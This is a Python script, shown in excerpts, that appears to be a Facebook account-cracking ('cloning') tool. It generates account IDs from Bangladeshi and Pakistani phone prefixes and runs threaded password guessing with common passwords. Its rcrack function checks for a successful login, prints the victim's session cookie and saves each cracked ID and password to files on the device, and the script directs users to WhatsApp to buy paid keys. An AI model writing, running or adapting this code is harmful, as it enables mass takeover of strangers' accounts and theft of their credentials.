# Facebook: Μδ Ηαβιβ κΗαη
# Github: OSMANHACKER24 
...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   : Μδ Ηαβιβ κΗαη
\x1b[1;92m[+] ON FACEBOK   :  Μδ Ηαβιβ κΗαη
\x1b[1;93m[+] ON GITHUB    :  OSMANHACKER24 
...
def OSMAN():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/habib12h')
    OSMAN_OSMAN(logo)
...
def OSMAN_email():
    ...
    os.system("clear")
    OSMAN_OSMAN(logo)
    OSMAN_OSMAN(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    OSMAN_OSMAN(" -----------------------------------------------------------------------------------")
    rk1 = '.'
    rk2 = '1'
    rk3 = '0'
    ...
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        OSMAN_OSMAN('\033[1;97m====================================================')
        OSMAN_OSMAN(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        OSMAN_OSMAN(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        OSMAN_OSMAN(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        OSMAN_OSMAN('\033[1;97m====================================================')
        for love in user:
            OSMANuser=fastname+code+lasttname+love
...
def OSMAN_bd():
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        OSMAN_OSMAN(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        OSMAN_OSMAN(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}]\033[0;93m USE WIFI & DATA ')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        OSMAN_OSMAN('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
            uid = code+love
            for OSMAN in HamiiID:
                pwx.append(OSMAN)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------")
...
def OSMAN_pk():
    ...
    os.system("clear")
    OSMAN_OSMAN(logo)
    OSMAN_OSMAN(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    OSMAN_OSMAN(" ----------------------------------------------------------------------------------------------------")
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        OSMAN_OSMAN(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        OSMAN_OSMAN(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        OSMAN_OSMAN(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        OSMAN_OSMAN('\033[1;97m====================================================')
        for love in user:
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=VAqVZMAdzttsURCHA7O7W-hf; sb=VAqVZJ7dWHDzxOJUTleTms3v',
    ...
    'user-agent': pro }
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[OSMAN-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/OSMAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[OSMAN-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/OSMAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}OSMAN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def reg():
    ...
    r = requests.get('https://github.com/OSMANHACKER24/OSMANISBACK/blob/main/OSMANISBACK.txt').text
    if to in r:
        os.system('clear')
        ...
        os.system('am start https://wa.me/+8801947343586?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20OSMAN%20Paid%20Tools.%20My%20Key:%20'+id+OSMAN)
        reg()
...
def reg2():
    ...
    print (' Your id: ' + id+OSMAN)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801947343586?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20OSMAN=MEX%20Paid%20Tools.%20My%20Key:%20'+id+OSMAN)
